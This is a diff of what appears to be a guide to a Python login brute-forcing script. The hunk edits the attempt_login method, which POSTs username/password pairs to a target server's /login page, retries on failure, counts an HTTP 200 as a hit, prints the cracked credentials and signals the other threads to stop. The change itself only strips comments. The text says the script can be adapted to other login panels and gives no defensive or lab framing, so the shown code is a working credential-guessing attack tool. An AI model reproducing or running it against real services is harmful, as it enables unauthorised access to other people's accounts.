@@ -13,23 +13,21 @@ However, you can modify the script to work with other types of login panels, dep
 data = urllib.parse.urlencode({'username': u, 'password': p}).encode()
 req = urllib.request.Request(login_url, data=data)
 ```
-Modification:
+* Modification:
 
 ```
 def attempt_login(self, username, password):
     attempt = 0
     success = False
-    login_url = f"http://{self.server}/login"  # Change to the actual login URL
+    login_url = f"http://{self.server}/login"
 
     while attempt < RETRY_LIMIT and not success and not success_event.is_set():
         try:
-            # Prepare the data to be sent in the POST request
             data = urllib.parse.urlencode({'username': username, 'password': password}).encode()
             req = urllib.request.Request(login_url, data=data)
 
             with urllib.request.urlopen(req) as response:
-                # Check the response for successful login
-                if response.getcode() == 200:  # or some other success condition
+                if response.getcode() == 200:
                     print(f"SUCCESS: Username: {username} Password: {password}")
                     success_event.set()
                     success = True
